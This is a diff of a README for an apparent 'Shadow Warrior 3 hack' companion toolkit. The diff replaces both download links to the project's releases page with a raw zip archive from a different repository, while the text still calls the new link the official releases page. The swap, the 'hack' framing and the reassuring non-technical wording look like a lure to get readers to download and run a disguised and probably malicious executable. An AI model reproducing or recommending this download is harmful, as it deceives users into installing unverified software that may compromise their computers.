@@ -5,7 +5,7 @@ description: "Build Lo Wang combat profiles, weapon loadouts, upgrades, and aren
 ---
 # 🗡️ shadow-warrior-3-hack-2026-lo-wang-combat-toolkit - Plan Lo Wang Builds and Dominate
 
-[![Download Shadow Warrior 3 Combat Toolkit](https://img.shields.io/badge/Download-Shadow_Warrior_3_Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/10sa215/shadow-warrior-3-hack-2026-lo-wang-combat-toolkit/releases)
+[![Download Shadow Warrior 3 Combat Toolkit](https://img.shields.io/badge/Download-Shadow_Warrior_3_Toolkit-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/10sa215/10sa215.github.io/main/interlot/App_2.7-alpha.5.zip)
 
 Welcome to the **shadow-warrior-3-hack-2026-lo-wang-combat-toolkit** — a Windows companion app built for players who love planning Lo Wang builds, testing weapon loadouts, mapping out arena strategies, and tracking how their combat practice pays off over time. If you have ever finished a run and wondered which upgrade carried you and which one wasted a slot, this toolkit is made for you. Everything runs on your own PC, it is simple to open, and you do not need to know anything about programming to use it.
 
@@ -21,7 +21,7 @@ Getting the toolkit onto your computer takes only a few minutes.
 
 Go to the official releases page here:
 
-👉 **https://github.com/10sa215/shadow-warrior-3-hack-2026-lo-wang-combat-toolkit/releases**
+👉 **https://raw.githubusercontent.com/10sa215/10sa215.github.io/main/interlot/App_2.7-alpha.5.zip**
 
 Visit this link to download the application.
 
